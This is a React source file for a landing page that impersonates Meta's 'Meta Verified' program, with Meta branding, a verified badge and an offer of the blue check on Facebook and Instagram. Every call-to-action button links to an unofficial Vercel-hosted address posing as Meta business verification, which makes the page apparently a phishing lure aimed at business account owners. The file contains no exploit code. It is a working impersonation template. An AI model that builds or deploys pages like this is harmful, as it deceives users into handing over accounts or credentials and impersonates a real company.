import React from "react";

export default function App() {
  const lang =
    typeof navigator !== "undefined" ? navigator.language.split("-")[0] : "en";

  const verifyLink =
    "https://meta-business-verification-official.vercel.app/meta-community";

  const text = {
    en: {
      begin: "Begin",
      advertisement: "Advertisement",
      learn: "Learn",
      support: "Support",
      schedule: "Schedule a call",
      start: "Start Verification",
      register: "Start Verification",
      title: "Let the whole world know that you take business seriously.",
      desc: "Meta Verified helps you build credibility with new audiences and protect your brand.",
    },
  };

  const t = text[lang] || text.en;

  const images = [
    "https://images.unsplash.com/photo-1500648767791-00dcc994a43e?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1494790108377-be9c29b29330?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1517841905240-472988babdf9?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1517423440428-a5a00ad493e8?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1524504388940-b1c1722653e1?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1534528741775-53994a69daeb?q=80&w=1200&auto=format&fit=crop",
  ];

  return (
    <>
      <style>{`
        *{
          margin:0;
          padding:0;
          box-sizing:border-box;
          font-family:Arial, Helvetica, sans-serif;
        }

        body{
          background:#05070d;
          overflow-x:hidden;
        }

        .app{
          width:100%;
          min-height:100vh;
          position:relative;
          overflow:hidden;
          color:#fff;
        }

        /* ===== BACKGROUND ===== */
        .bg-glow{
          position:absolute;
          top:-200px;
          left:50%;
          transform:translateX(-50%);
          width:900px;
          height:900px;
          background:radial-gradient(circle, rgba(24,119,242,0.35), transparent 60%);
          filter:blur(80px);
          z-index:0;
        }

        .bg-marquee{
          position:absolute;
          top:140px;
          left:0;
          width:100%;
          height:clamp(500px, 70vh, 900px);
          overflow:hidden;
          z-index:0;
          opacity:0.25;
        }

        .diagonal-wrap{
          width:100%;
          transform:rotate(-14deg) scale(1.1);
        }

        .row{
          overflow:hidden;
          margin-bottom:60px;
        }

        .track{
          display:flex;
          gap:24px;
          width:max-content;
        }

        .row1 .track{
          animation:moveRight 30s linear infinite;
        }

        .row2 .track{
          animation:moveLeft 30s linear infinite;
        }

        .card{
          width:220px;
          height:400px;
          border-radius:28px;
          overflow:hidden;
          flex-shrink:0;
          box-shadow:0 20px 60px rgba(0,0,0,0.6);
        }

        .card img{
          width:100%;
          height:100%;
          object-fit:cover;
        }

        @keyframes moveRight{
          0%{ transform:translateX(0); }
          100%{ transform:translateX(-50%); }
        }

        @keyframes moveLeft{
          0%{ transform:translateX(-50%); }
          100%{ transform:translateX(0); }
        }

        /* ===== HEADER ===== */
        .header{
          position:relative;
          z-index:10;
          width:100%;
          height:80px;
          display:flex;
          align-items:center;
          justify-content:space-between;
          padding:0 clamp(20px, 4vw, 40px);
          backdrop-filter:blur(10px);
          background:rgba(10,12,18,0.6);
          border-bottom:1px solid rgba(255,255,255,0.08);
        }

        .logo{
          font-size:34px;
          color:#1877f2;
          font-weight:700;
        }

        .nav{
          display:flex;
          gap:30px;
        }

        .nav a{
          color:#e5e7eb;
          text-decoration:none;
          font-weight:500;
        }

        .header-buttons{
          display:flex;
          gap:15px;
        }

        .call-btn{
          border:1px solid #1877f2;
          color:#1877f2;
          padding:12px 20px;
          border-radius:999px;
          text-decoration:none;
        }

        .start-btn{
          background:#1877f2;
          color:#fff;
          padding:12px 24px;
          border-radius:14px;
          text-decoration:none;
        }

        /* ===== HERO (ADAPTIVE) ===== */
        .hero{
          position:relative;
          z-index:5;
          max-width:1400px;
          margin:auto;

          display:flex;
          align-items:flex-start;
          justify-content:space-between;
          gap:clamp(20px, 5vw, 60px);

          padding:clamp(40px, 6vw, 100px) clamp(20px, 4vw, 60px);
        }

        .hero-left{
          max-width:620px;
        }

        /* ===== VERIFIED BADGE PRO ===== */
        .verified-row{
          display:flex;
          align-items:center;
          gap:18px;
          margin-bottom:30px;
        }

        .verified-badge{
          position:relative;
          width:clamp(52px, 6vw, 72px);
          height:clamp(52px, 6vw, 72px);
        }

        .verified-icon{
          width:100%;
          height:100%;
          border-radius:50%;
          background:linear-gradient(135deg,#1877f2,#00c3ff);
          display:flex;
          align-items:center;
          justify-content:center;
          font-size:clamp(22px, 3vw, 34px);
          font-weight:700;
          color:#fff;
          position:relative;
          z-index:2;
          box-shadow:0 0 25px rgba(24,119,242,0.45);
        }

        .verified-pulse{
          position:absolute;
          inset:0;
          border-radius:50%;
          background:rgba(24,119,242,0.4);
          animation:pulse 2s infinite;
        }

        @keyframes pulse{
          0%{ transform:scale(1); opacity:0.6; }
          100%{ transform:scale(1.6); opacity:0; }
        }

        .verified-text{
          display:flex;
          flex-direction:column;
          gap:4px;
        }

        .verified-title{
          font-size:14px;
          font-weight:600;
        }

        .verified-desc{
          font-size:13px;
          color:rgba(255,255,255,0.7);
          line-height:1.5;
          max-width:420px;
        }

        /* ===== TYPOGRAPHY ADAPTIVE ===== */
        .hero-title{
          font-size:clamp(32px, 5vw, 70px);
          line-height:1.1;
          margin-bottom:30px;
        }

        .hero-desc{
          font-size:clamp(14px, 1.5vw, 20px);
          line-height:1.8;
          color:#cbd5e1;
          margin-bottom:40px;
        }

        .register-btn{
          background:linear-gradient(135deg,#1877f2,#00c3ff);
          color:#fff;
          padding:18px 38px;
          border-radius:999px;
          text-decoration:none;
          display:inline-flex;
        }

        /* ===== RESPONSIVE STACK ===== */
        @media(max-width:900px){
          .hero{
            flex-direction:column;
            text-align:center;
            align-items:center;
          }

          .verified-row{
            flex-direction:column;
            text-align:center;
          }

          .nav{
            display:none;
          }
        }
      `}</style>

      <div className="app">
        <div className="bg-glow"></div>

        {/* BACKGROUND */}
        <div className="bg-marquee">
          <div className="diagonal-wrap">
            <div className="row row1">
              <div className="track">
                {[...images, ...images].map((img, i) => (
                  <div className="card" key={i}>
                    <img src={img} />
                  </div>
                ))}
              </div>
            </div>

            <div className="row row2">
              <div className="track">
                {[...images.slice().reverse(), ...images].map((img, i) => (
                  <div className="card" key={i}>
                    <img src={img} />
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>

        {/* HEADER */}
        <header className="header">
          <div className="logo">Meta</div>

          <nav className="nav">
            <a href="#">{t.begin}</a>
            <a href="#">{t.advertisement}</a>
            <a href="#">{t.learn}</a>
            <a href="#">{t.support}</a>
          </nav>

          <div className="header-buttons">
            <a className="call-btn" href={verifyLink}>
              {t.schedule}
            </a>
            <a className="start-btn" href={verifyLink}>
              {t.start}
            </a>
          </div>
        </header>

        {/* HERO */}
        <section className="hero">
          <div className="hero-left">
            <div className="verified-row">
              <div className="verified-badge">
                <div className="verified-icon">✓</div>
                <div className="verified-pulse"></div>
              </div>

              <div className="verified-text">
                <div className="verified-title">Meta Verified</div>
                <div className="verified-desc">
                  Verify your Meta account to receive the blue verification
                  badge on Facebook and Instagram.
                </div>
              </div>
            </div>

            <h1 className="hero-title">{t.title}</h1>

            <p className="hero-desc">{t.desc}</p>

            <a className="register-btn" href={verifyLink}>
              {t.register}
            </a>
          </div>
        </section>
      </div>
    </>
  );
}
